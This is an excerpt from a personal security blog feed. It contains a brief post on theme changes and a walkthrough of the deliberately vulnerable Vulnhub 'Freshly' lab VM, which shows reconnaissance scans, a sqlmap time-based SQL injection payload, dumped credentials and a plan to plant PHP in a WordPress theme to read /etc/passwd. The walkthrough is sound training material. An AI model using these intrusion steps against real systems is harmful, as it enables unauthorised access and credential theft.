&lt;/span&gt;&lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="ow"&gt;and&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;me&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;know&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;that&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;have&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;beat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;box&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;SECRET&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;LIVE LONG AND PROSPER, REST IN PEACE MR. SPOCK&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;admin&lt;/span&gt;&lt;span class="nv"&gt;@top&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;hat&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;sec&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="conclusion"&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This was a nice challenge as I learned a lot about the port knocking. The
privilege escalation was quit interesting to search for and the CVE-2015-1328
exploitation was a lot of fun.&lt;/p&gt;
&lt;p&gt;Thank you &lt;a href="http://top-hat-sec.com"&gt;top-hat-sec&lt;/a&gt; for this challenge and
&lt;a href="http://vulnhub.com"&gt;vulnhub&lt;/a&gt; as always.&lt;/p&gt;
&lt;h1 id="disqus-comments"&gt;Disqus comments&lt;/h1&gt;
&lt;p&gt;&lt;em&gt;This is a copy of the Disqus comments for this page&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Lamia Ladypower - 2015&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Thank you for your solution. I liked how you thought specially in the last part (finding the vulnerability in ubuntu). But, i have one question, how did you import the script ofs.c to ubuntu server ?
I am waiting for your reply.
Thank you in advance&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;maggick - 2015&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;As you get a shell, there is a lot of solutions:
scp (as you mentioned), netcat or even the copy-paste support from your terminal.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Lamia Ladypower - 2015&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I solved the problem. I used scp&lt;/p&gt;
&lt;/blockquote&gt;</content><category term="security"></category><category term="challenge"></category><category term="security"></category><category term="boot2root"></category><category term="vulnhub"></category><category term="linux"></category></entry><entry><title>Blog changes #2</title><link href="https://maggick.fr/2015/05/blog-changes-2.html" rel="alternate"></link><published>2015-05-15T16:30:00+02:00</published><updated>2015-05-15T16:30:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2015-05-15:/2015/05/blog-changes-2.html</id><summary type="html">&lt;p&gt;&lt;img alt="blog screenshot" class="align-left" src="/media/2015.05/site.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;There was a lot of changes lately on the blog. I rewrite the urls, I moved the
notes section, I displayed the categories in the menu, add a favicon and add a
markdown plugin.&lt;/p&gt;
&lt;p&gt;I wrote more "about" pages, separating the "about me" and "about website" pages and
creating a sports pages with my time for each race I run.&lt;/p&gt;
&lt;p&gt;I also tweak the theme by adding icons, adding borders around code blocs,
putting the same CSS to pages as to articles and some minors improvements.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2015.05/site.png" alt="blog screenshot" width="262"&gt;&lt;/p&gt;
&lt;p&gt;There was a lot of changes lately on the blog. I rewrite the urls, I moved the
notes section, I displayed the categories in the menu, add a favicon and add a
markdown plugin.&lt;/p&gt;
&lt;p&gt;I wrote more "about" pages, separating the "about me" and "about website" pages and
creating a sports pages with my time for each race I run.&lt;/p&gt;
&lt;p&gt;I also tweak the theme by adding icons, adding borders around code blocs,
putting the same CSS to pages as to articles and some minors improvements.&lt;/p&gt;


&lt;h1 id="site-changes"&gt;Site changes&lt;/h1&gt;
&lt;h2 id="notes"&gt;Notes&lt;/h2&gt;
&lt;p&gt;There was two part of the website, the /blog and the /notes.
First of all I moved the about pages which where located in the notes section
and put it as a &lt;a href="/pages/about.html"&gt;static page in the /blog&lt;/a&gt; part and then I
moved all the notes into &lt;a href="/pages/notes.html"&gt;a notes page&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id="error-page"&gt;Error page&lt;/h2&gt;
&lt;p&gt;I remove the 404 page from github to put my own with a link to the
&lt;a href="/archives.html"&gt;archives&lt;/a&gt; and to the &lt;a href="/pages/notes.html"&gt;notes&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id="categories"&gt;Categories&lt;/h2&gt;
&lt;p&gt;I Display the category in the menu. A theme change was needed as the original
one does not handle them.&lt;/p&gt;
&lt;h2 id="plugin"&gt;Plugin&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;I use the
   &lt;a href="https://github.com/getpelican/pelican-plugins/tree/master/summary"&gt;Summary pelican plugin&lt;/a&gt;
   in order to control the summary size.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;I use the
   &lt;a href="https://pythonhosted.org/Markdown/extensions/toc.html"&gt;toc markdwon plugin&lt;/a&gt;
   in order to make a simple table of content.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;I use &lt;a href="http://www.google.com/analytic"&gt;Google Analytics&lt;/a&gt; in order to track
   the number of visitor (you can disable javascript if you do not want to be
   tracked).&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="favicon"&gt;Favicon&lt;/h2&gt;
&lt;p&gt;I add a favicon to the website.&lt;/p&gt;
&lt;h2 id="about-pages"&gt;About pages&lt;/h2&gt;
&lt;p&gt;I separate the &lt;a href="/pages/about.html"&gt;about page&lt;/a&gt; from the
&lt;a href="/pages/about-this-website.html"&gt;about website pages&lt;/a&gt; and wrote a &lt;a href="pages/palmares.html"&gt;sport
page&lt;/a&gt; with my personal records for races and a link to the
&lt;a href="http://strava.com"&gt;Strava&lt;/a&gt; gps trace.&lt;/p&gt;
&lt;h1 id="theme-tweaking"&gt;Theme tweaking&lt;/h1&gt;
&lt;p&gt;It tweak the &lt;a href="https://github.com/kplaube/maggner-pelican"&gt;maggner pelican theme&lt;/a&gt;
a lot and &lt;a href="https://github.com/maggick/maggner-pelican"&gt;my repository&lt;/a&gt; is in
advance of a few commits compared to the original one. In fact I add a few
features to the theme:&lt;/p&gt;
&lt;p&gt;A menu section to be added in the config file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;MENUITEMS = (&lt;/span&gt;
&lt;span class="code-line"&gt;  (&amp;#39;Notes&amp;#39;, &amp;#39;https://www.maggick.fr/notes&amp;#39;),&lt;/span&gt;
&lt;span class="code-line"&gt;  (&amp;#39;RSS / ATOM feed&amp;#39;, &amp;#39;http://www.maggick.fr/blog/feeds/all.atom.xml&amp;#39;),)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;A link section (blogroll) as in the main pelican themes, also configurable:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Blogroll&lt;/span&gt;
&lt;span class="code-line"&gt;LINKS = ((&amp;#39;Pelican&amp;#39;, &amp;#39;http://getpelican.com/&amp;#39;),&lt;/span&gt;
&lt;span class="code-line"&gt;     (&amp;#39;Python.org&amp;#39;, &amp;#39;http://python.org/&amp;#39;),&lt;/span&gt;
&lt;span class="code-line"&gt;     (&amp;#39;Jinja2&amp;#39;, &amp;#39;http://jinja.pocoo.org/&amp;#39;),)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;
&lt;li&gt;In the archives, the date is before the article and its format is like
   '24 May 2015'.&lt;/li&gt;
&lt;li&gt;The social buttons at the end of an article are now configured in the pelican
   configuration.&lt;/li&gt;
&lt;li&gt;In the archives the date and the article title are separated with some space.&lt;/li&gt;
&lt;li&gt;The categories can be display in the menu.&lt;/li&gt;
&lt;li&gt;The social links are preceded with the corresponding social icon.&lt;/li&gt;
&lt;li&gt;The archives and feeds links are preceded with a nice icon.&lt;/li&gt;
&lt;li&gt;The pages CSS will now be the same as the articles one. For instance the
   links in the pages are now in red as there were like the rest of the text
   before.&lt;/li&gt;
&lt;li&gt;Add a border to each bloc of code.&lt;/li&gt;
&lt;/ul&gt;</content><category term="misc"></category><category term="blog"></category><category term="misc"></category></entry><entry><title>Vulnhub - Freshly</title><link href="https://maggick.fr/2015/04/vulnhub-freshly.html" rel="alternate"></link><published>2015-04-20T00:00:00+02:00</published><updated>2015-04-20T00:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2015-04-20:/2015/04/vulnhub-freshly.html</id><summary type="html">&lt;p&gt;&lt;img alt="not the droids" class="align-left" src="/media/2015.04/index_html_tumblr_mdeo27ZZjB1r6pf3eo1_500.gif" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;I continued to play with the vulnhub virtual machine and started the
&lt;a href="https://www.vulnhub.com/entry/tophatsec-freshly,118/"&gt;TopHatSec - Freshly&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;"The goal of this challenge is to break into the machine via the web and find the
secret hidden in a sensitive file. If you can find the secret, send me an email
for verification. :)"&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2015.04/index_html_tumblr_mdeo27ZZjB1r6pf3eo1_500.gif"
alt="not the droids" width="262"&gt;&lt;/p&gt;
&lt;p&gt;I continued to play with the vulnhub virtual machine and started the
&lt;a href="https://www.vulnhub.com/entry/tophatsec-freshly,118/"&gt;TopHatSec - Freshly&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;"The goal of this challenge is to break into the machine via the web and find the
secret hidden in a sensitive file. If you can find the secret, send me an email
for verification. :)"&lt;/p&gt;


&lt;h1 id="discovery"&gt;Discovery&lt;/h1&gt;
&lt;p&gt;As always we need to know which ports are open.&lt;/p&gt;
&lt;h2 id="nmap"&gt;nmap&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 6.47 scan initiated Thu Apr 16 19:13:39 2015 as: nmap -A -A -oA nmap 10.0.2.5&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.0.2.5&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.00087s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 997 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT     STATE SERVICE  VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp   open  http     Apache httpd 2.4.7 ((Ubuntu))&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-title: Site doesn&amp;#39;t have a title (text/html).&lt;/span&gt;
&lt;span class="code-line"&gt;443/tcp  open  ssl/http Apache httpd&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-methods: No Allow or Public header in OPTIONS response (status code 200)&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-title: Site doesn&amp;#39;t have a title (text/html).&lt;/span&gt;
&lt;span class="code-line"&gt;| ssl-cert: Subject: commonName=www.example.com&lt;/span&gt;
&lt;span class="code-line"&gt;| Not valid before: 2015-02-17T03:30:05+00:00&lt;/span&gt;
&lt;span class="code-line"&gt;|_Not valid after:  2025-02-14T03:30:05+00:00&lt;/span&gt;
&lt;span class="code-line"&gt;|_ssl-date: 2047-09-11T02:34:36+00:00; +32y147d13h20m44s from local time.&lt;/span&gt;
&lt;span class="code-line"&gt;8080/tcp open  http     Apache httpd&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-methods: No Allow or Public header in OPTIONS response (status code 200)&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-title: Site doesn&amp;#39;t have a title (text/html).&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Thu Apr 16 19:13:52 2015 -- 1 IP address (1 host up) scanned in 12.77 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;There is three ports with a web server running:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The 80 just display an gif.&lt;/li&gt;
&lt;li&gt;The 443 seems to be like the 8080 with SSL.&lt;/li&gt;
&lt;li&gt;The 8080 is a wordpress website which seems to sell candy (who doesn't love
      candy?).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="not the droids" src="/media/2015.04/index_html_tumblr_mdeo27ZZjB1r6pf3eo1_500.gif"&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;I try to see if there was any differences between this gif and the original
one, but nothing.&lt;/em&gt;&lt;/p&gt;
&lt;h2 id="nikto"&gt;Nikto&lt;/h2&gt;
&lt;p&gt;I like to use &lt;a href="https://cirt.net/Nikto2"&gt;Nikto&lt;/a&gt; when discovering website, I will put only the
interesting stuff, but I ran &lt;a href="https://cirt.net/Nikto2"&gt;Nikto&lt;/a&gt; on the 3 ports.&lt;/p&gt;
&lt;p&gt;Port 80:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[maggick@rootine Freshly]$ nikto -host 10.0.2.5&lt;/span&gt;
&lt;span class="code-line"&gt;Server: Apache/2.4.7 (Ubuntu)&lt;/span&gt;
&lt;span class="code-line"&gt;+ /login.php: Admin login page/section found.&lt;/span&gt;
&lt;span class="code-line"&gt;+ /phpmyadmin/: phpMyAdmin directory found&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;img alt="login.php" src="/media/2015.04/login.php.png"&gt;&lt;/p&gt;
&lt;p&gt;Port 8080:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[maggick@rootine Freshly]$ nikto -host 10.0.2.5 -port 8080&lt;/span&gt;
&lt;span class="code-line"&gt;+ OSVDB-3268: /img/: Directory indexing found.&lt;/span&gt;
&lt;span class="code-line"&gt;+ /wordpress/: A Wordpress installation was found&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We got two login interfaces and a directory listing with images. Let's take a
look at the wordpress installation.&lt;/p&gt;
&lt;p&gt;&lt;img alt="wordpress, index" src="/media/2015.04/wordpress_index.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;The directory listening was not of any use. As well the phpmyadmin interface
was not usefull.&lt;/em&gt;&lt;/p&gt;
&lt;h2 id="wpscan"&gt;WPScan&lt;/h2&gt;
&lt;p&gt;We run &lt;a href="https://github.com/wpscanteam/wpscan"&gt;&lt;code&gt;wpscan&lt;/code&gt;&lt;/a&gt; on the 8080 website:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[maggick@rootine wpscan]$ ruby wpscan.rb --url http://10.0.2.5:8080/wordpress/&lt;/span&gt;
&lt;span class="code-line"&gt;[+] URL: http://10.0.2.5:8080/wordpress/&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Started: Thu Apr 16 20:01:39 2015&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[!] The WordPress &amp;#39;http://10.0.2.5:8080/wordpress/readme.html&amp;#39; file exists exposing a version number&lt;/span&gt;
&lt;span class="code-line"&gt;[!] Full Path Disclosure (FPD) in: &amp;#39;http://10.0.2.5:8080/wordpress/wp-includes/rss-functions.php&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Interesting header: SERVER: Apache&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN&lt;/span&gt;
&lt;span class="code-line"&gt;[+] XML-RPC Interface available under: http://10.0.2.5:8080/wordpress/xmlrpc.php&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] WordPress version 4.1.1 identified from meta generator&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Enumerating plugins from passive detection ...&lt;/span&gt;
&lt;span class="code-line"&gt; | 4 plugins found:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Name: cart66-lite - v1.5.3&lt;/span&gt;
&lt;span class="code-line"&gt; |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/cart66-lite/&lt;/span&gt;
&lt;span class="code-line"&gt; |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[!] Title: Cart66 Lite &amp;lt;= 1.5.3 - SQL Injection&lt;/span&gt;
&lt;span class="code-line"&gt;    Reference: https://wpvulndb.com/vulnerabilities/7737&lt;/span&gt;
&lt;span class="code-line"&gt;    Reference: https://research.g0blin.co.uk/g0blin-00022/&lt;/span&gt;
&lt;span class="code-line"&gt;    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442&lt;/span&gt;
&lt;span class="code-line"&gt;[i] Fixed in: 1.5.4&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Name: contact-form-7 - v4.1&lt;/span&gt;
&lt;span class="code-line"&gt; |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/contact-form-7/&lt;/span&gt;
&lt;span class="code-line"&gt; |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/contact-form-7/readme.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Name: proplayer - v4.7.9.1&lt;/span&gt;
&lt;span class="code-line"&gt; |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/proplayer/&lt;/span&gt;
&lt;span class="code-line"&gt; |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/proplayer/readme.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[!] Title: ProPlayer 4.7.9.1 - SQL Injection&lt;/span&gt;
&lt;span class="code-line"&gt;    Reference: https://wpvulndb.com/vulnerabilities/6912&lt;/span&gt;
&lt;span class="code-line"&gt;    Reference: http://osvdb.org/93564&lt;/span&gt;
&lt;span class="code-line"&gt;    Reference: http://www.exploit-db.com/exploits/25605/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Name: all-in-one-seo-pack - v2.2.5.1&lt;/span&gt;
&lt;span class="code-line"&gt; |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/&lt;/span&gt;
&lt;span class="code-line"&gt; |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/readme.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[!] Title: All in One SEO Pack &amp;lt;= 2.2.5.1 - Authentication Bypass&lt;/span&gt;
&lt;span class="code-line"&gt;    Reference: https://wpvulndb.com/vulnerabilities/7881&lt;/span&gt;
&lt;span class="code-line"&gt;    Reference: http://jvn.jp/en/jp/JVN75615300/index.html&lt;/span&gt;
&lt;span class="code-line"&gt;    Reference: http://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/&lt;/span&gt;
&lt;span class="code-line"&gt;    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0902&lt;/span&gt;
&lt;span class="code-line"&gt;[i] Fixed in: 2.2.6&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We got some nice results, three plug-in have security issues. Digging furtherer,
we notice that:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;All in One SEO Pack  - Authentication Bypas: There was nothing in the metadata.&lt;/li&gt;
&lt;li&gt;Cart66 Lite 1.5.3 - SQL Injection: Need to be authenticated&lt;/li&gt;
&lt;li&gt;proplayer 4.7.9.1 - SQL Injection: Concerns a non available URL (you can run sqlmap on it to confirm this)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Therefore none of this will help us in this challenge.&lt;/p&gt;
&lt;h1 id="exploit"&gt;Exploit&lt;/h1&gt;
&lt;p&gt;Nikto shows us some interesting URL. The login interface at &lt;code&gt;login.php&lt;/code&gt; may be
injectable.&lt;/p&gt;
&lt;h2 id="sqlmap"&gt;sqlmap&lt;/h2&gt;
&lt;p&gt;We need to use burp in order to save the POST request to a file, an then we
launch &lt;a href="http://sqlmap,org"&gt;sqlmap&lt;/a&gt; on the &lt;code&gt;login.php&lt;/code&gt; URL:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[maggick@rootine sqlmap]$ python2 sqlmap.py -r login_req -p user&lt;/span&gt;
&lt;span class="code-line"&gt;         _&lt;/span&gt;
&lt;span class="code-line"&gt; ___ ___| |_____ ___ ___  {1.0-dev-dbfa8f1}&lt;/span&gt;
&lt;span class="code-line"&gt;|_ -| . | |     | .&amp;#39;| . |&lt;/span&gt;
&lt;span class="code-line"&gt;|___|_  |_|_|_|_|__,|  _|&lt;/span&gt;
&lt;span class="code-line"&gt;      |_|           |_|   http://sqlmap.org&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] starting at 20:43:22&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[20:43:22] [INFO] parsing HTTP request from &amp;#39;/home/maggick/work/chall/vulnhub/Freshly/login_req&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;[20:43:22] [INFO] resuming back-end DBMS &amp;#39;mysql&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;[20:43:22] [INFO] testing connection to the target URL&lt;/span&gt;
&lt;span class="code-line"&gt;[20:43:22] [INFO] heuristics detected web page charset &amp;#39;ascii&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;sqlmap identified the following injection points with a total of 0 HTTP(s)&lt;/span&gt;
&lt;span class="code-line"&gt;requests:&lt;/span&gt;
&lt;span class="code-line"&gt;---&lt;/span&gt;
&lt;span class="code-line"&gt;Parameter: user (POST)&lt;/span&gt;
&lt;span class="code-line"&gt;    Type: AND/OR time-based blind&lt;/span&gt;
&lt;span class="code-line"&gt;    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT)&lt;/span&gt;
&lt;span class="code-line"&gt;    Payload: user=asdf&amp;#39; AND (SELECT * FROM (SELECT(SLEEP(5)))RaKL) AND &amp;#39;KuPd&amp;#39;=&amp;#39;KuPd&amp;amp;password=asdf&amp;amp;s=Submit&lt;/span&gt;
&lt;span class="code-line"&gt;---&lt;/span&gt;
&lt;span class="code-line"&gt;[20:43:22] [INFO] the back-end DBMS is MySQL&lt;/span&gt;
&lt;span class="code-line"&gt;web server operating system: Linux Ubuntu&lt;/span&gt;
&lt;span class="code-line"&gt;web application technology: Apache 2.4.7, PHP 5.5.9&lt;/span&gt;
&lt;span class="code-line"&gt;back-end DBMS: MySQL 5.0.12&lt;/span&gt;
&lt;span class="code-line"&gt;[20:43:22] [INFO] fetched data logged to text files under &amp;#39;/home/maggick/.sqlmap/output/10.0.2.5&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] shutting down at 20:43:22&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Okay the &lt;code&gt;user&lt;/code&gt; parameter is vulnerable to a time-based blind injection. Let's
see what are the databases:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[maggick@rootine sqlmap]$ python2 sqlmap.py -r ~/work/chall/vulnhub/Freshly/longin_req -p user --dbs&lt;/span&gt;
&lt;span class="code-line"&gt;back-end DBMS: MySQL 5.0.12&lt;/span&gt;
&lt;span class="code-line"&gt;[...]&lt;/span&gt;
&lt;span class="code-line"&gt;available databases [7]:&lt;/span&gt;
&lt;span class="code-line"&gt;[*] information_schema&lt;/span&gt;
&lt;span class="code-line"&gt;[*] login&lt;/span&gt;
&lt;span class="code-line"&gt;[*] mysql&lt;/span&gt;
&lt;span class="code-line"&gt;[*] performance_schema&lt;/span&gt;
&lt;span class="code-line"&gt;[*] phpmyadmin&lt;/span&gt;
&lt;span class="code-line"&gt;[*] users&lt;/span&gt;
&lt;span class="code-line"&gt;[*] wordpress8080&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let's dump the interesting databases, &lt;code&gt;users&lt;/code&gt; and &lt;code&gt;login&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;users:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Database: login&lt;/span&gt;
&lt;span class="code-line"&gt;Table: users&lt;/span&gt;
&lt;span class="code-line"&gt;[2 entries]&lt;/span&gt;
&lt;span class="code-line"&gt;+----------+-----------+&lt;/span&gt;
&lt;span class="code-line"&gt;| password | user_name |&lt;/span&gt;
&lt;span class="code-line"&gt;+----------+-----------+&lt;/span&gt;
&lt;span class="code-line"&gt;| password | candyshop |&lt;/span&gt;
&lt;span class="code-line"&gt;| PopRocks | Sir       |&lt;/span&gt;
&lt;span class="code-line"&gt;+----------+-----------+&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;login:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Database: wordpress8080&lt;/span&gt;
&lt;span class="code-line"&gt;Table: users&lt;/span&gt;
&lt;span class="code-line"&gt;[1 entry]&lt;/span&gt;
&lt;span class="code-line"&gt;+----------+---------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;| username | password            |&lt;/span&gt;
&lt;span class="code-line"&gt;+----------+---------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;| admin    | SuperSecretPassword |&lt;/span&gt;
&lt;span class="code-line"&gt;+----------+---------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;So we got some passwords. Then let's use the wordpress password.&lt;/p&gt;
&lt;h2 id="admin-php-and-flag"&gt;Admin, PHP and Flag&lt;/h2&gt;
&lt;p&gt;We got the admin password for &lt;code&gt;http://10.0.2.5:8080/wordpress/wp-login&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="wordpress, admin interface" src="/media/2015.04/wordpress_admin.png"&gt;&lt;/p&gt;
&lt;p&gt;As we want to read a file on the system, let's put some PHP code in the theme:
We go to Appearance -&amp;gt; Editor -&amp;gt; Footer (footer.php) and add some PHP code in
order to execute it, let's get the &lt;code&gt;/etc/passwd&lt;/code&gt; file :&lt;/p&gt;
